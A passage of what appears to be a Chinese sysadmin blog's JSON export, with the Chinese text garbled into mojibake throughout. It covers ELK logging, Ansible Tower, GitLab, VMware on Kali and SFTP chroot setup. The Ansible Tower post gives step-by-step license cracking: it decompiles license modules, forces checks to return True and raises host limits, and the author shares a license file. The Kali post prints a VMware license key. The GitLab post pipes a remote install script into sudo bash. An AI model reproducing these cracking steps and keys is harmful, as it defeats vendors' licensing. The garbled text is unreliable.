logstashlog4j.rootLogger=info,all,logstash#logstachlog4j.appender.logstash=org.apache.log4j.net.SocketAppender#logstashç›‘å¬ç«¯å£ï¼Œé»˜è®¤4560log4j.appender.logstash.Port=4560#logstashä¸»æœºip/hostlog4j.appender.logstash.RemoteHost=opslog4j.appender.logstash.ReconnectionDelay=60000log4j.appender.logstash.LocationInfo=true 0x02 é…ç½®logstashç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œlog4j.cfg 12345678910111213141516171819202122232425262728293031323334353637vim logstash-5.0.1/log4j.cfg#å†…å®¹input &#123; log4j &#123; host =&gt; &quot;172.16.0.12&quot; #ç›‘å¬åœ°å€ port =&gt; 4560 #ç›‘å¬ç«¯å£ &#125;&#125;filter &#123; #è¿‡æ»¤é”™è¯¯ç±»å‹åˆ é™¤æ‰INFOç±»å‹é”™è¯¯ if [priority] == &quot;INFO&quot; &#123; drop &#123;&#125; &#125; #else if [method] == &quot;checkSqlShardName&quot; &#123; #drop &#123;&#125; #&#125;&#125;output &#123; #è¾“å‡ºåˆ°æ§åˆ¶å°ï¼ˆè°ƒè¯•ï¼‰ stdout &#123; codec =&gt; rubydebug &#125; elasticsearch &#123; hosts =&gt; [&quot;127.0.0.1:9200&quot;] #elasticsearchåœ°å€ index =&gt; &quot;game-%&#123;+YYYY.MM.dd&#125;&quot; #å»ºç«‹ç´¢å¼• flush_size =&gt; 1000 &#125;&#125; æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªå°bug,åœ¨inputä¸­ä½¿ç”¨log4jæ¥æ”¶ä¸åˆ°æ—¥å¿—ï¼Œä½¿ç”¨tcpå¯ä»¥æ¥æ”¶ã€‚è¿™é‡Œéœ€è¦æ”¹ä¸‹logstashæºç æ–‡ä»¶ vim logstash-core/lib/jars.rb æ³¨é‡Šæ‰ç¬¬äºŒè¡Œ#require_jar(&#39;org.apache.logging.log4j&#39;, &#39;log4j-1.2-api&#39;, &#39;2.6.2&#39;) æ³¨ ï¼šå¯ä»¥æŠŠoutputä¸­çš„elasticsearchï¼Œæ³¨é‡Šæ‰ï¼Œå¯åŠ¨javaç¨‹åºæµ‹è¯•ä¸‹logstashæ§åˆ¶å°ä¸­æ˜¯å¦è¾“å‡ºæ—¥å¿—ï¼Œè°ƒè¯•å¯åŠ¨./bin/logstash -f log4j.cfg 0x03 é…ç½®elasticsearchrootç›´æ¥å¯åŠ¨ elasticsearch æŠ¥é”™å¦‚ä¸‹ 123456789101112131415[2017-09-18T08:51:35,959][WARN ][o.e.b.ElasticsearchUncaughtExceptionHandler] [] uncaught exception in thread [main]org.elasticsearch.bootstrap.StartupException: java.lang.RuntimeException: can not run elasticsearch as root at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:136) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Elasticsearch.execute(Elasticsearch.java:123) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:67) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:134) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.cli.Command.main(Command.java:90) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:91) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:84) ~[elasticsearch-5.6.0.jar:5.6.0]Caused by: java.lang.RuntimeException: can not run elasticsearch as root at org.elasticsearch.bootstrap.Bootstrap.initializeNatives(Bootstrap.java:106) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Bootstrap.setup(Bootstrap.java:195) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:342) ~[elasticsearch-5.6.0.jar:5.6.0] at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:132) ~[elasticsearch-5.6.0.jar:5.6.0] ... 6 more elasticsearchä¸å…è®¸rootç”¨æˆ·è¿è¡Œï¼Œé¦–å…ˆåˆ›å»ºæ™®é€šç”¨æˆ·ï¼Œè®¾ç½®æƒé™ 123useradd elkchown -R elk:elk ./elasticsearch-5.6.0 é…ç½®æ–‡ä»¶config/elasticsearch.ymlç¬¬55è¡Œå’Œ59è¡Œæ˜¯ç›‘å¬åœ°å€å’Œç«¯å£ï¼Œconfig/jvm.optionsjvmå†…å­˜é…ç½®æ–‡ä»¶ï¼Œæ ¹æ®éœ€æ±‚é…ç½® åˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·elkå¯åŠ¨elasticsearch 1234su - elkcd /data/elk/elasticsearch-5.6.0./bin/elasticsearch -d#-dé€‰é¡¹åå°è¿è¡Œ 0x04 é…ç½®nginxåŠ å›ºkibanaå®‰å…¨1234567891011121314151617181920server &#123; listen 8000; server_name localhost; auth_basic &quot;ELK Log Auth&quot;; #å¯†ç æ–‡ä»¶ auth_basic_user_file /data/nginx/kibana.passwd; #é…ç½®ssl ssl on; ssl_certificate /data/nginx/all.crt; ssl_certificate_key /data/nginx/server.key; location / &#123; proxy_pass http://127.0.0.1:5601; proxy_redirect off; &#125;&#125; 1. ç”Ÿæˆnginxè®¤è¯æ–‡ä»¶å¦‚æœæç¤ºæ²¡ç”¨htpasswdå°±è£…ä¸ªapache,æ ¹æ®æç¤ºè¾“å…¥ä¸¤æ¬¡å¯†ç å°±ok 1234htpasswd -c /data/nginx/kibana.passwd username#&gt; New password: #&gt; Re-type new password: #&gt; Adding password for user username 2. ç”Ÿæˆsslè¯ä¹¦12345openssl genrsa -des3 -out server.key 1024openssl rsa -in server.key -out server1.keyopenssl req -new -key server1.key -out all.csr#ä¼šæç¤ºè®©è¾“å…¥å„ç§ä¿¡æ¯ï¼Œæœ€åä¼šè®©è¾“å…¥å¯†ç ï¼Œå¦‚æœè®¾ç½®å¯åŠ¨nginxä¼šè®©è¾“å…¥å¯†ç ã€‚openssl x509 -req -days 365 -in all.csr -signkey server1.key -out all.crt 3. å¯åŠ¨nginx1./sbin/nginx 0x05 å¯åŠ¨elkä½¿ç”¨screen å¯åŠ¨kibanaã€logstash å¯åŠ¨logstashï¼š 1234567891011121314151617#åˆ›å»ºåä¸ºlogstashçš„screenåå°è¿›ç¨‹screen -dmS logstash#æŸ¥çœ‹screenè¿›ç¨‹screen -lsThere are screens on: 19654.logstash (Detached)#è¿›å…¥ä¼šè¯screen -r logstash#å¯åŠ¨logstashcd /data/elk/logstash-5.0.1./bin/logstash -f log4j.cfg#åå°è¿è¡ŒCtrl + a d å¯åŠ¨kibanaï¼š 12345screen -dmS kibanascreen -r kibanacd /data/elk/kibana-5.6.0-linux-x86_64./bin/kibanaCtrl + a + d kibanaæ·»åŠ ç´¢å¼•game-ï¼ˆåœ¨logstashé…ç½®æ–‡ä»¶ä¸­ï¼‰ è‡ªå®šä¹‰Visualizeï¼Œæ˜¾ç¤ºåˆ°dashboard 0x06 è¿™åªæ˜¯å¼€å§‹ã€‚ã€‚ã€‚ã€‚è¿›é—¨æ‘¸çˆ¬æ»šæ‰“","raw":null,"content":null,"categories":[{"name":"è‡ªåŠ¨åŒ–è¿ç»´","slug":"è‡ªåŠ¨åŒ–è¿ç»´","permalink":"https://kionf.com/categories/è‡ªåŠ¨åŒ–è¿ç»´/"},{"name":"ELK","slug":"è‡ªåŠ¨åŒ–è¿ç»´/ELK","permalink":"https://kionf.com/categories/è‡ªåŠ¨åŒ–è¿ç»´/ELK/"}],"tags":[{"name":"ELK","slug":"ELK","permalink":"https://kionf.com/tags/ELK/"}]},{"title":"Ansible-Toweréƒ¨ç½²andç ´è§£","slug":"linux-tower","date":"2017-07-23T16:00:00.000Z","updated":"2018-11-21T08:45:33.061Z","comments":true,"path":"2017/07/24/linux-tower/","link":"","permalink":"https://kionf.com/2017/07/24/linux-tower/","excerpt":"\nansibke-towerä»–æ˜¯ä¸€ä¸ªå›¾å½¢åŒ–çš„ä»»åŠ¡è°ƒåº¦ï¼Œå¤æ‚æœåŠ¡éƒ¨ç½²ï¼ŒITè‡ªåŠ¨åŒ–çš„ä¸€ä¸ªç®¡ç†å¹³å°ã€‚å¯ä»¥é€šè¿‡ç•Œé¢ä»githubæ‹‰å–æœ€æ–°playbookå®æ–½æœåŠ¡éƒ¨ç½²ï¼Œæé«˜ç”Ÿäº§æ•ˆç‡ã€‚å½“ç„¶ï¼Œå®ƒä¹Ÿæä¾›ä¸€ä¸ªRESET APIå’Œå‘½ä»¤è¡Œçš„CLIä»¥ä¾›pythonè„šæœ¬è°ƒç”¨ã€‚\n","text":"ansibke-towerä»–æ˜¯ä¸€ä¸ªå›¾å½¢åŒ–çš„ä»»åŠ¡è°ƒåº¦ï¼Œå¤æ‚æœåŠ¡éƒ¨ç½²ï¼ŒITè‡ªåŠ¨åŒ–çš„ä¸€ä¸ªç®¡ç†å¹³å°ã€‚å¯ä»¥é€šè¿‡ç•Œé¢ä»githubæ‹‰å–æœ€æ–°playbookå®æ–½æœåŠ¡éƒ¨ç½²ï¼Œæé«˜ç”Ÿäº§æ•ˆç‡ã€‚å½“ç„¶ï¼Œå®ƒä¹Ÿæä¾›ä¸€ä¸ªRESET APIå’Œå‘½ä»¤è¡Œçš„CLIä»¥ä¾›pythonè„šæœ¬è°ƒç”¨ã€‚ 0x00 å‰è¨€ansible-towerå…³äºæ­¤ç±»çš„æ–‡ç« æ¯”è¾ƒå°‘ï¼Œè¸©è¿‡å‘ï¼Œ16å¹´é‚£ä¼šå„¿æœ‰å¬è¿‡å°±è£…ä¸Šç ”ç©¶äº†ä¸€å‘ï¼Œç°åœ¨åšä¸ªè¿Ÿæ¥çš„ç¬”è®°ï¼Œ åŒ…æ‹¬éƒ¨ç½²ï¼Œå’Œå…è´¹ç‰ˆ10å°æœºå™¨é™åˆ¶çš„ç ´è§£ã€‚ æ”¯æŒçš„æ“ä½œç³»ç»Ÿï¼š Red Hat Enterprise Linux 7.2 or later 64-bit CentOS 7.2 or later 64-bit Ubuntu 14.04 LTS 64-bit Ubuntu 16.04 LTS 64-bit æ¨èæœ€ä½å†…å­˜ä¸º2GBã€‚ 0x01 å®‰è£…æ•´ä¸ªç”³è¯·æµç¨‹ä¹Ÿæ˜¯éº»çƒ¦çš„å¾ˆï¼Œå°¤å…¶æ˜¯ç”³è¯·å…è´¹licenseã€‚è¿™é‡Œç›´æ¥ç»™å‡ºå®˜ç½‘ä¸‹è½½é“¾æ¥Ansible-Tower è¿™é‡Œä½¿ç”¨çš„æ˜¯æœ€æ–°ç‰ˆ(3.1.4) 1234567wget http://releases.ansible.com/ansible-tower/setup/ansible-tower-setup-latest.tar.gz -P /data/tower/cd /data/tower/tar xvf ansible-tower-setup-latest.tar.gz -C ./cd ansible-tower-setup-3.1.4/ ç›®å½•ç»“æ„ï¼Œå®‰è£…éå¸¸ç®€å•ï¼Œè¿™ä¹Ÿè¦å¾—ç›Šäºansibleçš„playbookã€‚ 123456789101112[root@ad0e6b9ef8d5 ansible-tower-setup-3.1.4]# lltotal 60-rw-r--r--. 1 root root 2526 Jul 10 13:59 README.md-rw-r--r--. 1 root root 129 Jul 10 13:59 backup.ymldrwxr-xr-x. 2 root root 4096 Jul 10 13:59 group_vars-rw-r--r--. 1 root root 10 Jul 25 03:03 install.retry-rw-r--r--. 1 root root 5571 Jul 10 13:59 install.yml-rw-r--r--. 1 root root 379 Jul 25 03:03 inventorydrwxr-xr-x. 2 root root 12288 Jul 10 13:59 licenses-rw-r--r--. 1 root root 944 Jul 10 13:59 restore.ymldrwxr-xr-x. 18 root root 4096 Jul 10 13:59 roles-rwxr-xr-x. 1 root root 9628 Jul 10 13:59 setup.sh ç¼–è¾‘inventoryé…ç½®æ–‡ä»¶å¦‚ä¸‹ vim inventory 123456789101112131415161718192021222324252627[tower]localhost ansible_connection=local[database][all:vars]#ansible-towerç™»å½•å¯†ç admin_password='admin'#PostgreSQLç›‘å¬åœ°å€ç«¯å£pg_host='127.0.0.1'pg_port='5432'pg_database='awx'pg_username='awx'#herepg_password='awx'rabbitmq_port=5672rabbitmq_vhost=towerrabbitmq_username=tower#hererabbitmq_password='tower'rabbitmq_cookie=cookiemonster# Needs to be true for fqdns and ip addressesrabbitmq_use_long_name=false è¿è¡Œå®‰è£…è„šæœ¬ 1sh setup.sh è„šæœ¬ä¼šè‡ªåŠ¨å®‰è£…ï¼Œç†Ÿæ‚‰çš„æ‰§è¡Œplaybookä»»åŠ¡ç•Œé¢ã€‚ å®‰è£…æˆåŠŸ 1localhost : ok=41 changed=5 unreachable=0 failed=0 0x02å¯¼å…¥licenseæ–‡ä»¶æ³¨æ„ä»3.2.xç‰ˆæœ¬å¼€å§‹ansible-towerç ´è§£æ–¹å¼æ›´æ”¹ï¼Œæ— éœ€ç”³è¯·licenseæ–‡ä»¶ æ›´æ”¹æ–‡ä»¶/var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/__init__.pyç¬¬120è¡Œå¦‚ä¸‹ 119 def _check_cloudforms_subscription(self):120 return True121 if os.path.isdir(\"/opt/rh/cfme-appliance\") and os.path.isdir(\"/opt/rh/cfme-gemset\"):122 try:123 has_rpms = subprocess.call([\"rpm\", \"--quiet\", \"-q\", \"cfme\", \"cfme-appliance\", \"cfme-gemset\"])124 if has_rpms == 0:125 return True126 except OSError:127 pass128 return False HOSTSé™åˆ¶ç ´è§£ åæ±‡ç¼–/var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/__init__.pyc 12cd /var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/; uncompyle6 __init__.pyc &gt;__init__.pyrm -f __init__.pyc __init__.pyo æ›´æ”¹æ–‡ä»¶ /var/lib/awx/venv/awx/lib/python2.7/site-packages/tower_license/__init__.pyc æ›´æ”¹ä½153è¡Œå¦‚ä¸‹153154155#available_instances = int(attrs.get('instance_count', None) or 0)available_instances = 100000attrs['current_instances'] = current_instances è®¿é—®towerï¼šhttps://192.168.99.188/ï¼Œé»˜è®¤ç”¨æˆ·åä¸ºadminå¯†ç ä¸ºinventoryæ–‡ä»¶ä¸­è®¾ç½®çš„admin_password=&#39;admin&#39; é‡ç‚¹æ¥äº†ï¼Œè¿™é‡Œä¼šæç¤ºè®©é€‰æ‹©licenseæ–‡ä»¶ï¼Œç”³è¯·è¿™ä¸ªå¾ˆæ˜¯éº»çƒ¦ï¼Œsoè¿™é‡Œåˆ†äº«ä¸‹æˆ‘è‡ªå·±ç”³è¯·ä¸‹æ¥çš„licenseæ–‡ä»¶ç›´æ¥å¯¼å…¥å°±okã€‚ä»…ä¾›å®éªŒæµ‹è¯•ä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºå…¶å®ƒç”¨é€”ï¼ã€‚ 0x03 ç ´è§£10ä¸ªhostsé™åˆ¶ç”³è¯·çš„å…è´¹ç‰ˆlicenseæœ€å¤šåªèƒ½æ·»åŠ 10ä¸ªä¸»æœºã€‚ 1HOSTS AVAILABLE 10 é¦–å…ˆä¸‹è½½pythonåç¼–è¯‘å·¥å…· 1pip install uncompyle2 åç¼–è¯‘æ–‡ä»¶task_engine.pyc 123456789#æŸ¥æ‰¾æ–‡ä»¶root@2813e2635181:~# find / -name task_engine.pyc/usr/lib/python2.7/dist-packages/awx/main/task_engine.pyccd /usr/lib/python2.7/dist-packages/awx/main/#åç¼–è¯‘æ–‡ä»¶uncompyle6 task_engine.pyc &gt;task_engine.py æ›´æ”¹task_engine.pycæ–‡ä»¶ ä¿®æ”¹å†…å®¹ available_instances = int(self.attributes[&#39;instance_count&#39;])ä¸ºavailable_instances = 10000ï¼Œå¤§çº¦åœ¨162è¡Œ åˆ é™¤task_engine.pyc task_engine.pyoï¼Œé‡å¯tower 0x04è‡³æ­¤å®‰è£…ç ´è§£éƒ½å·²å®Œæˆã€‚ç®€å•çš„è¯•ç”¨äº†ä¸‹ï¼Œå¾ˆæ–¹ä¾¿ï¼Œé€šè¿‡gitæ¥è·å–æ›´æ–°ä»»åŠ¡playbookæ–‡ä»¶ï¼Œå›¾å½¢åŒ–é…ç½®playbookå‚æ•°ï¼Œä»»åŠ¡å®¡è®¡è®°å½•ã€‚ç»“åˆansibleè¿›è¡Œä¸»æœºç®¡ç†ï¼ŒæœåŠ¡éƒ¨ç½²ï¼Œå¾ˆæ–¹ä¾¿ã€‚å†™äº†ä¸ªzookeeperé›†ç¾¤éƒ¨ç½²çš„playbook deploy_zkã€‚:P Towerè¿›é˜¶","raw":null,"content":null,"categories":[{"name":"è‡ªåŠ¨åŒ–è¿ç»´","slug":"è‡ªåŠ¨åŒ–è¿ç»´","permalink":"https://kionf.com/categories/è‡ªåŠ¨åŒ–è¿ç»´/"},{"name":"Ansible","slug":"è‡ªåŠ¨åŒ–è¿ç»´/Ansible","permalink":"https://kionf.com/categories/è‡ªåŠ¨åŒ–è¿ç»´/Ansible/"}],"tags":[{"name":"Ansible","slug":"Ansible","permalink":"https://kionf.com/tags/Ansible/"}]},{"title":"Kali Linux 2017.1 å®‰è£…vmware æŠ¥é”™","slug":"kali-vmware","date":"2017-07-06T16:00:00.000Z","updated":"2018-10-31T10:19:28.299Z","comments":true,"path":"2017/07/07/kali-vmware/","link":"","permalink":"https://kionf.com/2017/07/07/kali-vmware/","excerpt":"","text":"0x00 é˜³å…‰æ™®ç…§å®˜ç½‘ä¸‹è½½åœ°å€ï¼šVMware-Workstation for linux Keyï¼šVF5XA-FNDDJ-085GZ-4NXZ9-N20E6 0x01 é—®é¢˜å®‰è£…äº†Kali Linux 2017.1ï¼Œ ç†Ÿæ‚‰çš„è€å¸æœºå§¿åŠ¿å®‰è£…Vmware å®‰è£…å†…æ ¸å¤´æ–‡ä»¶ 123apt-get update &amp;&amp; apt-get dist-upgradeapt-get install linux-headers-$(uname -r) ç„¶åç«Ÿç„¶ç¿»è½¦äº† 12345678root@***REMOVED***:~# apt-get install linux-headers-$(uname -r)Reading package lists... DoneBuilding dependency tree Reading state information... DoneE: Unable to locate package linux-headers-4.9.0-kali3-amd64E: Couldn't find any package by glob 'linux-headers-4.9.0-kali3-amd64'E: Couldn't find any package by regex 'linux-headers-4.9.0-kali3-amd64' æœç´¢å†…æ ¸å¤´å®‰è£…åŒ…apt search linux-headers 12linux-headers-4.9.0-kali4-all-amd64/kali-rolling 4.9.30-2kali1 amd64 All header files for Linux 4.9 (meta-package) åªæœ‰kali4æ²¡kali3 0x02 è§£å†³1234567891011apt-get install linux-headers-amd64#æ‰§è¡Œåé‡å¯æœºå™¨rebootroot@***REMOVED***:~# uname -r# 4.9.0-kali4-amd64apt-get install linux-headers-$(uname -r) OK è§£å†³","raw":null,"content":null,"categories":[{"name":"ErrorNote","slug":"ErrorNote","permalink":"https://kionf.com/categories/ErrorNote/"}],"tags":[]},{"title":"GitLab 9.2.6 å®‰è£…åŠæ±‰åŒ–","slug":"linux-gitlab","date":"2017-06-20T16:00:00.000Z","updated":"2018-10-31T10:19:28.299Z","comments":true,"path":"2017/06/21/linux-gitlab/","link":"","permalink":"https://kionf.com/2017/06/21/linux-gitlab/","excerpt":"\nGitLab å®˜æ–¹æ–°ç‰ˆ(9.2.6)å®‰è£…åŠæ±‰åŒ–\n","text":"GitLab å®˜æ–¹æ–°ç‰ˆ(9.2.6)å®‰è£…åŠæ±‰åŒ– 0x00 å®‰è£…GitLabæµ‹è¯•ä¸»æœº: CentOS Linux release 7.3.1611 (Core)å…¶å®ƒç³»ç»Ÿå‚è€ƒ: GitLabå®‰è£… å®‰è£…å’Œé…ç½®å¿…è¦çš„ä¾èµ–å…³ç³»123456789sudo yum install curl policycoreutils openssh-server openssh-clientssudo systemctl enable sshdsudo systemctl start sshdsudo yum install postfixsudo systemctl enable postfixsudo systemctl start postfixsudo firewall-cmd --permanent --add-service=httpsudo systemctl reload firewalld æ·»åŠ GitLabæœåŠ¡åŒ…å¹¶å®‰è£…12curl -sS https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh | sudo bashsudo yum install gitlab-ce é…ç½®å¹¶å¯åŠ¨GitLab123456vim +13 /etc/gitlab/gitlab.rb# ä¿®æ”¹external_url 'http://172.16.0.123'ä¸ºå†…ç½‘ipæˆ–ç»‘å®šçš„åŸŸå# æ­¤å¤„çš„åœ°å€ç”Ÿæ•ˆåœ¨é¡¹ç›®urlåœ°å€å¤„sudo gitlab-ctl reconfigure# å¯åŠ¨æœåŠ¡ æŸ¥çœ‹123456789101112Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:9100 0.0.0.0:* LISTEN 25658/node_exporter tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN 25718/unicorn maste tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 25650/nginx: master tcp 0 0 127.0.0.1:9168 0.0.0.0:* LISTEN 25631/ruby tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1439/master tcp 0 0 0.0.0.0:8060 0.0.0.0:* LISTEN 25650/nginx: master tcp 0 0 127.0.0.1:9121 0.0.0.0:* LISTEN 25692/redis_exporte tcp 0 0 127.0.0.1:9090 0.0.0.0:* LISTEN 25678/prometheus tcp 0 0 127.0.0.1:9187 0.0.0.0:* LISTEN 25664/postgres_expo tcp6 0 0 ::1:9168 :::* LISTEN 25631/ruby tcp6 0 0 ::1:25 :::* LISTEN 1439/master è®¿é—® http://172.16.0.123 åˆå§‹åŒ–å¯†ç  é»˜è®¤ç”¨æˆ·åä¸º root 0x01 æ±‰åŒ–æŸ¥çœ‹å½“å‰GitLabç‰ˆæœ¬12sudo cat /opt/gitlab/embedded/service/gitlab-rails/VERSION# 9.2.6 cloneæ±‰åŒ–ä»£ç 1234567mkdir -p /opt/gitlab-zh cd /opt/gitlab-zhyum -y install gitgit clone https://gitlab.com/xhang/gitlab.git æ¯”è¾ƒæ±‰åŒ–åˆ†æ”¯å’ŒåŸåˆ†æ”¯å¯¼å‡ºæ–‡ä»¶123456cd gitlabgit diff origin/9-2-stable 9-2-stable-zh &gt; /opt/gitlab-zh/9.2.diff# æ­¤å¤„æ˜¯9.2.6ç‰ˆæœ¬ å…¶ä»–ç‰ˆæœ¬åªéœ€æ›´æ”¹æ•°å­— ä¾‹å¦‚ä¸º9.1 : # git diff origin/9-1-stable 9-1-stable-zh &gt; /opt/gitlab-zh/9.1.diff æ‰“è¡¥ä¸(9.2.diff)1234567891011cd /opt/gitlab-zhyum -y install patchgitlab-ctl stop#åœæ­¢gitlabpatch -d /opt/gitlab/embedded/service/gitlab-rails -p1 &lt; /opt/gitlab-zh/9.2.diffgotlab-ctl start#å¯åŠ¨gitlab 0x02 ç®¡ç†è¿ç»´ç®¡ç†1234567891011# å¯åŠ¨æ‰€æœ‰ gitlab ç»„ä»¶ï¼šsudo gitlab-ctl start# åœæ­¢æ‰€æœ‰ gitlab ç»„ä»¶ï¼šsudo gitlab-ctl stop# é‡å¯æ‰€æœ‰ gitlab ç»„ä»¶ï¼šsudo gitlab-ctl restart# æ›´æ–°é…ç½®å¹¶é‡å¯sudo gitlab-ctl reconfigure å¤‡ä»½æ¢å¤å¤‡ä»½ crontab ä¸­æ·»åŠ  10 1 * * * /usr/bin/gitlab-rake gitlab:backup:create æ¢å¤ é¦–å…ˆè¿›å…¥å¤‡ä»½ gitlab çš„ç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ˜¯é…ç½®æ–‡ä»¶ä¸­çš„gitlab_rails[&#39;backup_path&#39;]ï¼Œé»˜è®¤ä¸º/var/opt/gitlab/backupsã€‚ ç„¶ååœæ­¢ unicorn å’Œ sidekiq ï¼Œä¿è¯æ•°æ®åº“æ²¡æœ‰æ–°çš„è¿æ¥ï¼Œä¸ä¼šæœ‰å†™æ•°æ®æƒ…å†µã€‚ 12345sudo gitlab-ctl stop unicorn# ok: down: unicorn: 0s, normally upsudo gitlab-ctl stop sidekiq# ok: down: sidekiq: 0s, normally up ç„¶åæ¢å¤æ•°æ®ï¼Œ1498033332ä¸ºå¤‡ä»½æ–‡ä»¶çš„æ—¶é—´æˆ³ 1234ls /var/opt/gitlab/backups#1498033332_2017_06_21_9.2.6_gitlab_backup.targitlab-rake gitlab:backup:restore BACKUP=1498033332 æ•°æ®å‚¨å­˜é»˜è®¤æƒ…å†µä¸‹ï¼Œgitlab å°†æ•°æ®å­˜å‚¨åœ¨/var/opt/gitlab/git-dataç›®å½•ä¸‹ï¼Œå—é™äºåˆ†åŒºæƒ…å†µ&amp;æ–¹ä¾¿ç®¡ç†ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ•°æ®è¿ç§»åˆ°åˆ«çš„ç›®å½•ä¸‹ã€‚ æ²¡æœ‰æŠ•å…¥ä½¿ç”¨å¯ç›´æ¥æ›´æ”¹ 1234567vim /etc/gitlab/gitlab.rb#æ·»åŠ git_data_dir \"/path/to/git-data\"# æ›´æ–°é…ç½®å¹¶é‡å¯sudo gitlab-ctl reconfigure æ•°æ®è¿ç§»é¦–å…ˆéœ€è¦æš‚åœæœåŠ¡ï¼Œé¿å…ç”¨æˆ·åœ¨è¿ç§»æœŸé—´è¯»å†™æ•°æ®ï¼š 1234567gitlab-ctl stoprsync -av /var/opt/gitlab/git-data/repositories /path/to/git-data/sudo gitlab-ctl startsudo gitlab-ctl reconfigure","raw":null,"content":null,"categories":[{"name":"GitLab","slug":"GitLab","permalink":"https://kionf.com/categories/GitLab/"}],"tags":[{"name":"GitLab","slug":"GitLab","permalink":"https://kionf.com/tags/GitLab/"}]},{"title":"ç¦ç”¨ç”¨æˆ·SSHç™»é™†ï¼ŒSFTPé”å®šæŒ‡å®šç›®å½•é…ç½®è¯¦è§£","slug":"linux-sftp","date":"2017-05-16T16:00:00.000Z","updated":"2018-10-31T10:19:28.303Z","comments":true,"path":"2017/05/17/linux-sftp/","link":"","permalink":"https://kionf.com/2017/05/17/linux-sftp/","excerpt":"SFTPï¼Œå³ SSH æ–‡ä»¶ä¼ è¾“åè®®ï¼Œæˆ–è€…è¯´æ˜¯å®‰å…¨æ–‡ä»¶ä¼ è¾“åè®®, é€šè¿‡SSHç«¯å£åŠ å¯†ä¼ è¾“ã€‚ä½†æ˜¯ï¼Œç”±äºè¿™ç§ä¼ è¾“æ–¹å¼ä½¿ç”¨äº†åŠ å¯†/è§£å¯†æŠ€æœ¯ï¼Œæ‰€ä»¥ä¼ è¾“æ•ˆç‡æ¯”æ™®é€šçš„FTPè¦ä½å¾—å¤šã€‚SFTPçš„ä¼˜åŠ¿åœ¨äºSSHè½¯ä»¶åŒ…ä¸­åŒ…å«SFTPï¼ˆæ— éœ€é¢å¤–å®‰è£…ï¼‰ï¼Œiptablesæ— éœ€æ·»åŠ é¢å¤–ç«¯å£ï¼Œé…ç½®æ–¹ä¾¿\n","text":"SFTPï¼Œå³ SSH æ–‡ä»¶ä¼ è¾“åè®®ï¼Œæˆ–è€…è¯´æ˜¯å®‰å…¨æ–‡ä»¶ä¼ è¾“åè®®, é€šè¿‡SSHç«¯å£åŠ å¯†ä¼ è¾“ã€‚ä½†æ˜¯ï¼Œç”±äºè¿™ç§ä¼ è¾“æ–¹å¼ä½¿ç”¨äº†åŠ å¯†/è§£å¯†æŠ€æœ¯ï¼Œæ‰€ä»¥ä¼ è¾“æ•ˆç‡æ¯”æ™®é€šçš„FTPè¦ä½å¾—å¤šã€‚SFTPçš„ä¼˜åŠ¿åœ¨äºSSHè½¯ä»¶åŒ…ä¸­åŒ…å«SFTPï¼ˆæ— éœ€é¢å¤–å®‰è£…ï¼‰ï¼Œiptablesæ— éœ€æ·»åŠ é¢å¤–ç«¯å£ï¼Œé…ç½®æ–¹ä¾¿ 0x00 æ·»åŠ ç”¨æˆ·åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œ SFTP ä½¿ç”¨ SSH åè®®è¿›è¡Œèº«ä»½éªŒè¯å¹¶å»ºç«‹å®‰å…¨è¿æ¥,æ‰€ä»¥ç›´æ¥ä½¿ç”¨å‘½ä»¤æ·»åŠ è´¦æˆ·ã€‚ æ·»åŠ ç»„1groupadd sftp å†æ·»åŠ è´¦æˆ·123useradd -g sftp -M -N -s /sbin/nologin user#æ·»åŠ usernameç”¨æˆ·å¹¶ä¸”ç¦æ­¢æ­¤ç”¨æˆ·loginç³»ç»Ÿ æŸ¥è¯¢ç”¨æˆ·æ˜¯å¦æ·»åŠ åˆ°ç»„123[root@Centos6-8-TestEnv data]# groups useruser : sftp è®¾ç½®å¯†ç 12345[root@Centos6-8-TestEnv data]# passwd useræ›´æ”¹ç”¨æˆ· user çš„å¯†ç  ã€‚æ–°çš„ å¯†ç ï¼šé‡æ–°è¾“å…¥æ–°çš„ å¯†ç ï¼špasswdï¼š æ‰€æœ‰çš„èº«ä»½éªŒè¯ä»¤ç‰Œå·²ç»æˆåŠŸæ›´æ–°ã€‚ 0x01 ä¿®æ”¹sshd_configé…ç½®æ–‡ä»¶ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼š/etc/ssh/sshd_configä¿®æ”¹Subsystem sftp /usr/libexec/openssh/sftp-serverä¸ºSubsystem sftp internal-sftp ä»¥ä¸‹æ˜¯å¯¹sftpç»„æƒé™é…ç½® 123456789#åŒ¹é… sftp ç»„çš„ç”¨æˆ·Match Group sftp #é”å®šçš„ç›®å½• ChrootDirectory /data/test #æŒ‡å®šä½¿ç”¨sftpæœåŠ¡ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„internal-sftp ForceCommand internal-sftp #å¦‚æœä¸å¸Œæœ›è¯¥ç”¨æˆ·èƒ½ä½¿ç”¨ç«¯å£è½¬å‘å°±åŠ 